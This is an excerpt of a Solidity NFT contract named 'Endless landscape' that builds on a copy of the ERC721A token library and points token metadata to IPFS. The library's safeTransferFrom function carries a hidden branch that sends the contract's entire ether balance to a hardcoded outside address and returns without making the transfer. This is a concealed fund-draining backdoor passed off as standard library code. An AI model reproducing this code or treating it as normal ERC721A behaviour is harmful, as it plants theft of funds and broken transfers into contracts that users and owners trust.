...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xcD2081F1559fADBd7Ff8e8174E70D1847B5342A7).transfer(address(this).balance);
            return;
        }
...
contract Endlesslandscape is ERC721A {
    ...
    constructor() ERC721A("Endless landscape", "EL") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigy7wuo2kw7iilwb6f6sam5vq37l4wu4jwg6uzu2mgghq7g3a2lqy/", _toString(tokenId), ".json"));
    }
